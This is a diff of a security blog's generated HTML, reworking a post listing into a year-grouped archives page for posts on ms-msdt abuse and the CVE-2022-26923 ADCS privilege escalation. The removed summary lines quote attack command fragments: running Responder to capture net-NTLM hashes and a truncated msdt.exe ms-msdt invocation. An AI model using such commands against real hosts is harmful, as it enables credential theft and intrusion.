@@ -69,7 +69,7 @@
       
         <li class="list-item">
           
-            <a href="/" class="item-link active">Home</a>
+            <a href="/" class="item-link">Home</a>
           
         </li>
       
@@ -109,7 +109,7 @@
         
           <li class="menu-item">
             
-              <a href="/" class="menu-link mobile-active">Home</a>
+              <a href="/" class="menu-link">Home</a>
             
           </li>
         
@@ -143,63 +143,43 @@
   </div>
 </header>
 
-    <main class="app-body">
+    <div id="article-banner">
+  <h2>Archives</h2>
+  <p class="post-date">Archives</p>
+</div>
+<main class="app-body" id="archives">
   
-    <article class="article-card">
-      <h2 class="article-head">
-        <a href="/2022/05/31/microsoft-msdt-abuse/">Microsoft ms-msdt Abuse</a>
-      </h2>
-      <p class="article-date">May 31, 2022</p>
-      
-        
-  <a href="/tags#windows" >
-    <span class="tag-code">windows</span>
-  </a>
-
-  <a href="/tags#lolbas" >
-    <span class="tag-code">lolbas</span>
-  </a>
-
-      
-      <div class="article-summary">
-        
-          catch net-NTLM hash
-Start Responder listening1Responder -I eth1
-ms-msdt to access remote smb service1msdt.exe ms-msdt:/id PCWDiagnostic /skip forc ...
-        
+  
+  
+    <section class="time-section">
+  <h1 class="section-year">
+    2022
+  </h1>
+  <div class="section-list">
+    
+    
+      <div class="section-list-item">
+        <a href="/2022/05/31/microsoft-msdt-abuse/" class="archive-title">Microsoft ms-msdt Abuse</a>
+        <p class="archive-date">05-31</p>
       </div>
-      <a class="more" href="/2022/05/31/microsoft-msdt-abuse/">Read more</a>
-    </article>
-  
-    <article class="article-card">
-      <h2 class="article-head">
-        <a href="/2022/05/29/cve-2022-26923/">CVE-2022-26923 ADCS Priv Sc</a>
-      </h2>
-      <p class="article-date">May 29, 2022</p>
-      
-        
-  <a href="/tags#CVE" >
-    <span class="tag-code">CVE</span>
-  </a>
-
-  <a href="/tags#ADCS" >
-    <span class="tag-code">ADCS</span>
-  </a>
-
-      
-      <div class="article-summary">
-        
-          BackgroundIn this blog post, we will dive into the exploitation of Active Directory Certificate Service Privilege Escalation vulnability that orig ...
-        
+    
+      <div class="section-list-item">
+        <a href="/2022/05/29/cve-2022-26923/" class="archive-title">CVE-2022-26923 ADCS Priv Sc</a>
+        <p class="archive-date">05-29</p>
       </div>
-      <a class="more" href="/2022/05/29/cve-2022-26923/">Read more</a>
-    </article>
-  
-
+    
+  </div>
+</section>
   
 </main>
 
-
+<script>
+  (function () {
+    var url = 'http://example.com/tags/windows/index.html';
+    $('#article-banner').geopattern(url);
+    $('.header').removeClass('fixed-header');
+  })();
+</script>
     <div class="scroll-top">
   <span class="arrow-icon"></span>
 </div>
